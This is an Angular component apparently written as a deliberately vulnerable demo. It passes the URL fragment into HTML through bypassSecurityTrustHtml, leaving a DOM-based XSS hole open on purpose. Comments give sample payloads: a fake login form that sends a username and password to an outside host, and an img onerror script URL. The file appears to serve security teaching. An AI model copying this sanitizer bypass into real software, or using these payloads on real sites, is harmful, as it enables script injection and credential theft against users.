import { Component } from '@angular/core';
import { DomSanitizer } from '@angular/platform-browser';


@Component({
  selector: 'app-inner-html-binding',
  templateUrl: './inner-html-binding.component.html',
})
export class InnerHtmlBindingComponent {
  constructor(private _sanitizer: DomSanitizer) { }
  // For example, a user/attacker-controlled value from a URL.
  htmlSnippet = this._sanitizer.bypassSecurityTrustHtml("fragment (bypassSecurityTrustHtml): " + decodeURIComponent(location.hash));















  
  // Use the following:
  // HTML-Injection
//<form action="http://timo-pagel.de" method="get">  <label>Username: </label>  <input name="username" type="text"/>  <label>Password: </label>  <input name="password" type="text"/><button>Login</button></form>

// DOM based XSS
// http://localhost:4200/#%3Cimg%20src=%22x%22%20onerror=%22alert('hacked')%22%3E
}


